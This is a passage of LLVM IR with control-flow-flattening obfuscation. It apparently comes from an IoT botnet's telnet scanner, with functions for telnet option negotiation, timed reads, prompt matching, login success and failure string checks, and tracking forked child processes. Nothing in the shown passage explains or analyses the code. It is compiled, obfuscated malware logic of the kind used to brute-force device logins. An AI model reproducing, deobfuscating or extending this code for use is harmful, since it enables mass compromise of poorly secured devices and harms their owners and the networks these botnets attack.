  %28 = load i32, i32* %4, align 4
  %29 = zext i32 %28 to i64
  %30 = getelementptr inbounds i32, i32* %27, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = load i32*, i32** %3, align 8
  %33 = load i32, i32* %4, align 4
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds i32, i32* %32, i64 %34
  store i32 %31, i32* %35, align 4
  store i32 1809326181, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %4, align 4
  %38 = add i32 %37, 1
  store i32 %38, i32* %4, align 4
  store i32 1923019553, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %2, align 4
  %41 = load i32*, i32** %3, align 8
  %42 = load i64, i64* @numpids, align 8
  %43 = sub i64 %42, 1
  %44 = getelementptr inbounds i32, i32* %41, i64 %43
  store i32 %40, i32* %44, align 4
  %45 = load i32*, i32** @pids, align 8
  %46 = bitcast i32* %45 to i8*
  call void @free(i8* %46) #3
  %47 = load i32*, i32** %3, align 8
  store i32* %47, i32** @pids, align 8
  %48 = load i32, i32* %2, align 4
  store i32 %48, i32* %1, align 4
  store i32 455055999, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %39, %36, %26, %19, %11, %9, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #3
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %.reg2mem = alloca i32
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  store i32 %25, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 507713291, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 507713291, label %first
    i32 1042774363, label %28
    i32 1358954408, label %32
    i32 -1828544246, label %38
    i32 -1079396887, label %39
    i32 -2091673709, label %40
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %26 = icmp eq i32 %.reload, 255
  %27 = select i1 %26, i32 1042774363, i32 1358954408
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = load i32, i32* %7, align 4
  %30 = load i8*, i8** %9, align 8
  %31 = call i32 @negotiate(i32 %29, i8* %30, i32 3)
  store i32 1358954408, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i8*, i8** %9, align 8
  %34 = load i8**, i8*** %11, align 8
  %35 = call i32 @contains_string(i8* %33, i8** %34)
  %36 = icmp ne i32 %35, 0
  %37 = select i1 %36, i32 -1828544246, i32 -1079396887
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  store i32 1, i32* %6, align 4
  store i32 -2091673709, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %6, align 4
  store i32 -2091673709, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %6, align 4
  ret i32 %41

loopEnd:                                          ; preds = %39, %38, %32, %28, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.fd_set, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  %switchVar = alloca i32
  store i32 -1450027039, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1450027039, label %18
    i32 -2071614447, label %27
    i32 1098720184, label %44
    i32 -2066972153, label %45
    i32 1050796317, label %52
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %20 = getelementptr inbounds [16 x i64], [16 x i64]* %19, i64 0, i64 0
  %21 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %20) #3, !srcloc !4
  %22 = extractvalue { i64, i64* } %21, 0
  %23 = extractvalue { i64, i64* } %21, 1
  %24 = trunc i64 %22 to i32
  store i32 %24, i32* %12, align 4
  %25 = ptrtoint i64* %23 to i64
  %26 = trunc i64 %25 to i32
  store i32 %26, i32* %13, align 4
  store i32 -2071614447, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i32, i32* %6, align 4
  %29 = srem i32 %28, 64
  %30 = zext i32 %29 to i64
  %31 = shl i64 1, %30
  %32 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %33 = load i32, i32* %6, align 4
  %34 = sdiv i32 %33, 64
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %32, i64 0, i64 %35
  %37 = load i64, i64* %36, align 8
  %38 = or i64 %37, %31
  store i64 %38, i64* %36, align 8
  %39 = load i32, i32* %6, align 4
  %40 = add nsw i32 %39, 1
  %41 = call i32 @select(i32 %40, %struct.fd_set* %10, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %11)
  %42 = icmp slt i32 %41, 1
  %43 = select i1 %42, i32 1098720184, i32 -2066972153
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 1050796317, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %6, align 4
  %47 = load i8*, i8** %8, align 8
  %48 = load i32, i32* %9, align 4
  %49 = sext i32 %48 to i64
  %50 = call i64 @recv(i32 %46, i8* %47, i64 %49, i32 0)
  %51 = trunc i64 %50 to i32
  store i32 %51, i32* %5, align 4
  store i32 1050796317, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %5, align 4
  ret i32 %53

loopEnd:                                          ; preds = %45, %44, %27, %18, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @advance_state(%struct.telstate_t*, i32) #0 {
  %.reg2mem = alloca i32
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1612370029, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1612370029, label %first
    i32 478149364, label %8
    i32 246485419, label %13
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp eq i32 %.reload, 0
  %7 = select i1 %6, i32 478149364, i32 246485419
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %10 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %9, i32 0, i32 0
  %11 = load i32, i32* %10, align 8
  %12 = call i32 @close(i32 %11)
  store i32 246485419, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %15 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %14, i32 0, i32 7
  store i32 0, i32* %15, align 8
  %16 = load i32, i32* %4, align 4
  %17 = trunc i32 %16 to i8
  %18 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %19 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i32 0, i32 2
  store i8 %17, i8* %19, align 8
  %20 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %21 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i32 0, i32 9
  %22 = load i8*, i8** %21, align 8
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 1024, i32 1, i1 false)
  ret void

loopEnd:                                          ; preds = %8, %first, %switchDefault
  br label %loopEntry
}

declare i32 @close(i32) #2

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_state(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([4 x i8*], [4 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1894360648, i32* %switchVar
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1894360648, label %first
    i32 -2049476894, label %7
    i32 -601396881, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp ne i32 %.reload, 0
  %6 = select i1 %5, i32 -601396881, i32 -2049476894
  store i32 %6, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = load i8*, i8** %2, align 8
  %9 = call i32 @contains_fail(i8* %8)
  %10 = icmp ne i32 %9, 0
  store i32 -601396881, i32* %switchVar
  store i1 %10, i1* %.reg2mem2
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %12 = zext i1 %.reload3 to i32
  ret i32 %12

loopEnd:                                          ; preds = %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  %switchVar = alloca i32
  store i32 1858739485, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1858739485, label %8
    i32 1845294353, label %17
    i32 -649445419, label %18
    i32 -1978594586, label %19
    i32 -898016187, label %24
    i32 -626005313, label %34
    i32 -49728718, label %35
    i32 -62538183, label %36
    i32 396470362, label %39
    i32 -988011172, label %40
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = add nsw i32 %10, 1
  store i32 %11, i32* %6, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds i8*, i8** %9, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = icmp ne i8* %14, null
  %16 = select i1 %15, i32 1845294353, i32 -649445419
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 1858739485, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 -1978594586, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %7, align 4
  %21 = load i32, i32* %6, align 4
  %22 = icmp slt i32 %20, %21
  %23 = select i1 %22, i32 -898016187, i32 396470362
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %4, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8*, i8** %26, i64 %28
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %25, i8* %30)
  %32 = icmp ne i32 %31, 0
  %33 = select i1 %32, i32 -626005313, i32 -49728718
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 -988011172, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  store i32 -62538183, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %7, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %7, align 4
  store i32 -1978594586, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 -988011172, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %3, align 4
  ret i32 %41

loopEnd:                                          ; preds = %39, %36, %35, %34, %24, %19, %18, %17, %8, %switchDefault
  br label %loopEntry
}

declare i32 @strcasestr(...) #2

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %.reg2mem = alloca i32
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -215227321, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar3 = load i32, i32* %switchVar
  switch i32 %switchVar3, label %switchDefault [
    i32 -215227321, label %NodeBlock
    i32 227795745, label %LeafBlock1
    i32 399900161, label %LeafBlock
    i32 -1545033152, label %16
    i32 691985292, label %17
    i32 1475409354, label %26
    i32 555781621, label %27
    i32 -1701593751, label %34
    i32 2081245000, label %35
    i32 839210779, label %42
    i32 -225967036, label %50
    i32 1584224661, label %58
    i32 -639071410, label %59
    i32 1418789282, label %60
    i32 764198512, label %NewDefault
    i32 256196315, label %67
    i32 -1248705532, label %68
    i32 1727130071, label %69
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload5 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload5, 255
  %13 = select i1 %Pivot, i32 399900161, i32 227795745
  store i32 %13, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload, 255
  %14 = select i1 %SwitchLeaf2, i32 -1545033152, i32 764198512
  store i32 %14, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload4 = load volatile i32, i32* %.reg2mem
  %.off = add i32 %.reload4, -251
  %SwitchLeaf = icmp ule i32 %.off, 3
  %15 = select i1 %SwitchLeaf, i32 691985292, i32 764198512
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 1727130071, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i8 -1, i8* %8, align 1
  %18 = load i32, i32* %5, align 4
  %19 = call i64 @send(i32 %18, i8* %8, i64 1, i32 16384)
  %20 = load i8*, i8** %6, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp eq i32 252, %23
  %25 = select i1 %24, i32 1475409354, i32 555781621
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  store i8 -2, i8* %8, align 1
  store i32 1418789282, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i8*, i8** %6, align 8
  %29 = getelementptr inbounds i8, i8* %28, i64 1
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 254, %31
  %33 = select i1 %32, i32 -1701593751, i32 2081245000
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i8 -4, i8* %8, align 1
  store i32 -639071410, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i8*, i8** %6, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 3, %39
  %41 = select i1 %40, i32 839210779, i32 -225967036
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %6, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8, i8* %44, align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 253
  %48 = select i1 %47, i32 251, i32 253
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %8, align 1
  store i32 1584224661, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %6, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 253
  %56 = select i1 %55, i32 252, i32 254
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %8, align 1
  store i32 1584224661, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 -639071410, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 1418789282, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %5, align 4
  %62 = call i64 @send(i32 %61, i8* %8, i64 1, i32 16384)
  %63 = load i32, i32* %5, align 4
  %64 = load i8*, i8** %6, align 8
  %65 = getelementptr inbounds i8, i8* %64, i64 2
  %66 = call i64 @send(i32 %63, i8* %65, i64 1, i32 16384)
  store i32 -1248705532, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 256196315, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  store i32 -1248705532, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 1727130071, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %4, align 4
  ret i32 %70

loopEnd:                                          ; preds = %68, %67, %NewDefault, %60, %59, %58, %50, %42, %35, %34, %27, %26, %17, %16, %LeafBlock, %LeafBlock1, %NodeBlock, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.98, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #9
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  %switchVar = alloca i32
  store i32 -2059237150, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -2059237150, label %11
    i32 872615814, label %18
    i32 -1260339119, label %19
    i32 2139882853, label %24
    i32 -1935739727, label %37
    i32 435210717, label %50
    i32 -1102070317, label %63
    i32 1262613545, label %75
    i32 1300612603, label %76
    i32 1570060663, label %78
    i32 1389699698, label %81
    i32 -1149408723, label %100
    i32 1177719050, label %101
    i32 -1508373827, label %102
    i32 225922723, label %105
    i32 -54066213, label %106
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #9
  %16 = icmp ult i64 %13, %15
  %17 = select i1 %16, i32 872615814, i32 225922723
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  store i32 -1260339119, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %5, align 4
  %21 = load i32, i32* %7, align 4
  %22 = icmp sgt i32 %20, %21
  %23 = select i1 %22, i32 2139882853, i32 1300612603
  store i32 %23, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %3, align 8
  %26 = load i32, i32* %5, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %25, i64 %27
  %29 = load i32, i32* %7, align 4
  %30 = sext i32 %29 to i64
  %31 = sub i64 0, %30
  %32 = getelementptr inbounds i8, i8* %28, i64 %31
  %33 = load i8, i8* %32, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp eq i32 %34, 0
  %36 = select i1 %35, i32 1262613545, i32 -1935739727
  store i32 %36, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i8*, i8** %3, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = sub i64 0, %43
  %45 = getelementptr inbounds i8, i8* %41, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 32
  %49 = select i1 %48, i32 1262613545, i32 435210717
  store i32 %49, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %3, align 8
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i32, i32* %7, align 4
  %56 = sext i32 %55 to i64
  %57 = sub i64 0, %56
  %58 = getelementptr inbounds i8, i8* %54, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 13
  %62 = select i1 %61, i32 1262613545, i32 -1102070317
  store i32 %62, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i8*, i8** %3, align 8
  %65 = load i32, i32* %5, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %64, i64 %66
  %68 = load i32, i32* %7, align 4
  %69 = sext i32 %68 to i64
  %70 = sub i64 0, %69
  %71 = getelementptr inbounds i8, i8* %67, i64 %70
  %72 = load i8, i8* %71, align 1
  %73 = sext i8 %72 to i32
  %74 = icmp eq i32 %73, 10
  store i32 1262613545, i32* %switchVar
  store i1 %74, i1* %.reg2mem
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 1300612603, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %77 = select i1 %.reload3, i32 1570060663, i32 1389699698
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i32, i32* %7, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %7, align 4
  store i32 -1260339119, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i8*, i8** %3, align 8
  %83 = load i32, i32* %5, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8, i8* %82, i64 %84
  %86 = load i32, i32* %7, align 4
  %87 = sext i32 %86 to i64
  %88 = sub i64 0, %87
  %89 = getelementptr inbounds i8, i8* %85, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = sext i8 %90 to i32
  %92 = load i8*, i8** %4, align 8
  %93 = load i32, i32* %6, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8, i8* %92, i64 %94
  %96 = load i8, i8* %95, align 1
  %97 = sext i8 %96 to i32
  %98 = icmp eq i32 %91, %97
  %99 = select i1 %98, i32 -1149408723, i32 1177719050
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 -54066213, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  store i32 -1508373827, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %6, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %6, align 4
  store i32 -2059237150, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -54066213, i32* %switchVar
  br label %loopEnd

